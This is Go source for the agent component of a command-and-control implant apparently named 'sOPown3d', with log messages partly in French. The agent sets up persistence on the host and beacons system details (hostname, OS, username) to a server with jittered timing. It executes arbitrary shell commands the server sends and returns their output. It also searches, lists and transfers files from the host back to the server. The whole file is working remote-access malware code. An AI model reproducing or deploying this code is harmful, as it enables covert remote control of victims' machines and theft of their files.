package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"sOPown3d/internal/agent/commands"
	"sOPown3d/internal/agent/finder"
	"sOPown3d/internal/agent/jitter"
	"sOPown3d/internal/agent/persistence"
	"sOPown3d/pkg/shared"
)

type Config struct {
	ServerURL string
	Jitter    shared.JitterConfig
}

type Agent struct {
	serverURL  string
	http       *http.Client
	jitter     *jitter.JitterCalculator
	info       shared.AgentInfo
	cmdHandler *commands.Handler
}

func New(cfg Config) (*Agent, error) {
	info := gatherSystemInfo()

	jcalc, err := jitter.NewJitterCalculator(cfg.Jitter)
	if err != nil {
		return nil, fmt.Errorf("init jitter: %w", err)
	}

	persistence.SetupPersistence()

	// Initialize file command handler (50MB max file size)
	cmdHandler := commands.NewHandler(cfg.ServerURL, info.Hostname, 50<<20)

	return &Agent{
		serverURL:  cfg.ServerURL,
		http:       &http.Client{Timeout: 10 * time.Second},
		jitter:     jcalc,
		info:       info,
		cmdHandler: cmdHandler,
	}, nil
}

func (agent *Agent) Run(ctx context.Context) error {
	log.Printf("=== sOPown3d Agent ===")
	log.Printf("Agent ID: %s", agent.info.Hostname)
	log.Println(agent.jitter.GetStats())
	log.Println("En attente de commandes…")
	log.Println("----------------------------------------")

	i := 0
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		i++
		info := gatherSystemInfo()

		cmd := agent.retrieveCommand(info)
		if cmd != nil && cmd.Action != "" {
			output := executeCommand(cmd)
			if output != "" {
				agent.sendOutput(info.Hostname, output)
			}
		}

		// Poll for file commands (search, transfer)
		agent.pollFileCommands()

		next := agent.jitter.Next()
		log.Printf("[Heartbeat #%d] Next check in: %.2fs", i, next.Seconds())
		time.Sleep(next)
	}
}

func gatherSystemInfo() shared.AgentInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" && runtime.GOOS != "windows" {
		username = os.Getenv("USER")
	}

	return shared.AgentInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Username: username,
	}
}

func (agent *Agent) retrieveCommand(info shared.AgentInfo) *shared.Command {
	body, err := json.Marshal(info)
	if err != nil {
		log.Printf("marshal agent info error: %v", err)
		return nil
	}

	resp, err := agent.http.Post(agent.serverURL+"/beacon", "application/json", bytes.NewBuffer(body))
	if err != nil {
		log.Printf("beacon error: %v", err)
		return nil
	}
	defer resp.Body.Close()

	var cmd shared.Command
	if err := json.NewDecoder(resp.Body).Decode(&cmd); err != nil || cmd.Action == "" {
		return nil
	}

	return &cmd
}

func executeCommand(cmd *shared.Command) string {
	switch cmd.Action {
	case "shell":
		if cmd.Payload == "" {
			return ""
		}

		log.Printf("Exécute: %s", cmd.Payload)

		var c *exec.Cmd
		if runtime.GOOS == "windows" {
			c = exec.Command("cmd", "/c", cmd.Payload)
		} else {
			c = exec.Command("sh", "-c", cmd.Payload)
		}

		out, err := c.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Erreur: %v\n%s", err, string(out))
		}
		return string(out)

	case "info":
		log.Println("Info: déjà envoyé dans le beacon")
		return ""

	case "ping":
		log.Println("Pong!")
		return "Pong"

	case "persist":
		log.Println("📋 Vérification persistance…")
		if persistent, path := persistence.CheckStartup(); persistent {
			log.Printf("  ✓ Persistant\n  Chemin: %s", path)
		} else {
			log.Println("  ✗ Non persistant")
		}
		return ""

	default:
		log.Printf("Commande inconnue: %s", cmd.Action)
		return ""
	}
}

func (agent *Agent) sendOutput(agentID, output string) {
	payload := struct {
		AgentID string `json:"agent_id"`
		Output  string `json:"output"`
	}{
		AgentID: agentID,
		Output:  output,
	}

	body, err := json.Marshal(payload)
	if err != nil {
		log.Printf("marshal output error: %v", err)
		return
	}

	resp, err := agent.http.Post(agent.serverURL+"/ingest", "application/json", bytes.NewBuffer(body))
	if err != nil {
		log.Printf("ingest error: %v", err)
		return
	}
	defer resp.Body.Close()
}

// ──────────────────────────────────────────────
// File command polling
// ──────────────────────────────────────────────

func (agent *Agent) pollFileCommands() {
	resp, err := agent.http.Get(agent.serverURL + "/api/files/commands?agent_id=" + agent.info.Hostname)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var data struct {
		Commands []map[string]interface{} `json:"commands"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return
	}

	for _, cmd := range data.Commands {
		cmdType, _ := cmd["type"].(string)
		cmdID, _ := cmd["id"].(string)

		switch cmdType {
		case "file_search":
			agent.executeFileSearch(cmdID, cmd)
		case "file_list":
			agent.executeFileList(cmdID, cmd)
		case "file_transfer":
			agent.executeFileTransfer(cmdID, cmd)
		}
	}
}

func (agent *Agent) executeFileSearch(cmdID string, cmd map[string]interface{}) {
	log.Printf("📂 Executing file search command: %s", cmdID)

	criteria := buildSearchCriteria(cmd)

	results, err := agent.cmdHandler.Search(criteria)
	if err != nil {
		log.Printf("❌ Search error: %v", err)
		return
	}

	log.Printf("✓ Found %d files", len(results))

	// Build results payload
	var searchResults []map[string]interface{}
	for _, f := range results {
		searchResults = append(searchResults, map[string]interface{}{
			"file_path":   f.Path,
			"file_name":   f.Name,
			"file_size":   f.Size,
			"mod_time":    f.ModTime,
			"permissions": f.Permissions.String(),
		})
	}

	payload, _ := json.Marshal(map[string]interface{}{
		"command_id": cmdID,
		"results":    searchResults,
	})

	submitClient := &http.Client{Timeout: 60 * time.Second}
	resp, err := submitClient.Post(
		agent.serverURL+"/api/files/search-results/submit",
		"application/json",
		bytes.NewBuffer(payload),
	)
	if err != nil {
		log.Printf("❌ Failed to submit search results: %v", err)
		return
	}
	defer resp.Body.Close()

	log.Printf("✓ Search results submitted for command %s", cmdID)
}

func (agent *Agent) executeFileList(cmdID string, cmd map[string]interface{}) {
	path, _ := cmd["path"].(string)
	if path == "" {
		// Default: list root drives/directories
		if runtime.GOOS == "windows" {
			path = "C:\\"
		} else {
			path = "/"
		}
	}

	log.Printf("📂 Listing directory: %s (command: %s)", path, cmdID)

	entries, err := os.ReadDir(path)
	if err != nil {
		log.Printf("❌ List error: %v", err)
		return
	}

	var results []map[string]interface{}
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		results = append(results, map[string]interface{}{
			"file_path":   filepath.Join(path, entry.Name()),
			"file_name":   entry.Name(),
			"file_size":   info.Size(),
			"mod_time":    info.ModTime(),
			"permissions": info.Mode().String(),
			"is_dir":      entry.IsDir(),
		})
	}

	log.Printf("✓ Found %d entries in %s", len(results), path)

	payload, _ := json.Marshal(map[string]interface{}{
		"command_id": cmdID,
		"results":    results,
	})

	submitClient := &http.Client{Timeout: 30 * time.Second}
	resp, err := submitClient.Post(
		agent.serverURL+"/api/files/list-results/submit",
		"application/json",
		bytes.NewBuffer(payload),
	)
	if err != nil {
		log.Printf("❌ Failed to submit list results: %v", err)
		return
	}
	defer resp.Body.Close()

	log.Printf("✓ List results submitted for command %s", cmdID)
}
func (agent *Agent) submitListResults(cmdID string, results []map[string]interface{}) {
	payload, _ := json.Marshal(map[string]interface{}{
		"command_id": cmdID,
		"results":    results,
	})

	resp, err := agent.http.Post(
		agent.serverURL+"/api/files/list-results/submit",
		"application/json",
		bytes.NewBuffer(payload),
	)
	if err != nil {
		log.Printf("❌ Failed to submit list results: %v", err)
		return
	}
	defer resp.Body.Close()

	log.Printf("✓ List results submitted for command %s", cmdID)
}

func (agent *Agent) executeFileTransfer(cmdID string, cmd map[string]interface{}) {
	filePath, _ := cmd["file_path"].(string)
	if filePath == "" {
		return
	}

	log.Printf("Transferring file: %s (command: %s)", filePath, cmdID)

	errors := agent.cmdHandler.Transfer([]string{filePath})

	// Notify server of transfer result
	status := "completed"
	if err, exists := errors[filePath]; exists && err != nil {
		log.Printf("Transfer failed for %s: %v", filePath, err)
		status = "error"
	} else {
		log.Printf("File transferred: %s", filePath)
	}

	// Update transfer command status on server
	payload, _ := json.Marshal(map[string]interface{}{
		"command_id": cmdID,
		"status":     status,
	})

	resp, err := agent.http.Post(
		agent.serverURL+"/api/files/transfer-status/update",
		"application/json",
		bytes.NewBuffer(payload),
	)
	if err != nil {
		log.Printf("Failed to update transfer status: %v", err)
		return
	}
	defer resp.Body.Close()
}
func buildSearchCriteria(cmd map[string]interface{}) finder.SearchCriteria {
	criteria := finder.SearchCriteria{}

	if pattern, ok := cmd["pattern"].(string); ok {
		criteria.Pattern = pattern
	}

	if maxDepth, ok := cmd["max_depth"].(float64); ok {
		criteria.MaxDepth = int(maxDepth)
	}

	if paths, ok := cmd["search_paths"].([]interface{}); ok {
		for _, p := range paths {
			if s, ok := p.(string); ok {
				criteria.RootPaths = append(criteria.RootPaths, s)
			}
		}
	}

	if exts, ok := cmd["extensions"].([]interface{}); ok {
		for _, e := range exts {
			if s, ok := e.(string); ok {
				criteria.Extensions = append(criteria.Extensions, s)
			}
		}
	}

	return criteria
}

func sanitizeListPath(requested string) string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = "."
	}

	path := strings.TrimSpace(requested)
	if path == "" {
		return home
	}

	if !filepath.IsAbs(path) {
		path = filepath.Join(home, path)
	}

	path = filepath.Clean(path)
	if abs, err := filepath.Abs(path); err == nil {
		path = abs
	}

	if info, err := os.Stat(path); err == nil && !info.IsDir() {
		path = filepath.Dir(path)
	}

	rel, err := filepath.Rel(home, path)
	if err != nil {
		return home
	}
	if rel == "." {
		return path
	}
	if strings.HasPrefix(rel, "..") || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return home
	}

	return path
}
